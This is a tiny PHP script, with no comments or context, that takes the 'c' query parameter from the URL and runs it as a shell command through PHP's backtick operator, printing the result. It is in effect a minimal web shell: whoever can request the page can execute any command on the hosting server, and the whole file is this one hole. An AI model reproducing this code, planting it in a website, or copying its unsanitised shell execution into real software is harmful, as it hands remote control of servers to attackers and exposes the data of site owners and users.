<?php

$comando = $_GET['c'] ?? 'ls';
echo `${comando}`;
